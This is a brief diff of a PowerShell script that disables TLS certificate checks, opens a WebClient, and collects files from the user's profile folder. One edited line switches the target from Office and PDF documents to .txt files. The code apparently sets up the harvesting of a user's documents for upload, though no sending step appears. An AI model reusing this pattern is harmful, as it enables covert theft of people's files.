@@ -1,7 +1,7 @@
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; 
 $http = New-Object System.Net.WebClient; 
 
-#$files = Get-ChildItem $ENV:USERPROFILE -Recurse -Include *.doc,*.pdf,*.gif,*.xls
+#$files = Get-ChildItem $ENV:USERPROFILE -Recurse #-Include *.doc,*.pdf,*.gif,*.xls
 $files = Get-ChildItem $ENV:USERPROFILE\*.* -Include *.txt
 $i=0;
 
